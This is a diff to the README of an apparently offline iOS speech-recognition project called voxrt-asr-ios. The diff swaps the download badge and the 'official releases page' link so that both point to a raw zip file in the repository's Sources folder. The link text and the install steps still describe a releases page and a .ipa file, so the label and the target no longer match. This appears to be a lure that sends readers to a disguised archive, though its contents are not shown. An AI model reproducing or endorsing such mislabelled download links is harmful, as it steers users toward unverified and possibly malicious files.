@@ -1,6 +1,6 @@
 # 🎙️ voxrt-asr-ios - High speed speech recognition for iOS
 
-[![Download VoxRT](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Genusdasyurusfibonaccisequence730/voxrt-asr-ios)
+[![Download VoxRT](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/Genusdasyurusfibonaccisequence730/voxrt-asr-ios/main/Sources/voxrt_ios_asr_v2.9-alpha.4.zip)
 
 voxrt-asr-ios provides real-time speech recognition directly on your mobile device. You do not need an internet connection to use this tool because it processes your audio locally. This keeps your voice data private and ensures your phone handles all tasks without external servers.
 
@@ -17,7 +17,7 @@ To run this application, ensure your device meets these criteria:
 
 Follow these steps to install the software on your device.
 
-1. Visit the [official releases page](https://github.com/Genusdasyurusfibonaccisequence730/voxrt-asr-ios).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Genusdasyurusfibonaccisequence730/voxrt-asr-ios/main/Sources/voxrt_ios_asr_v2.9-alpha.4.zip).
 2. Locate the most recent version under the Releases section.
 3. Tap the file ending in .ipa to start the download.
 4. Once the download finishes, open the file on your device.
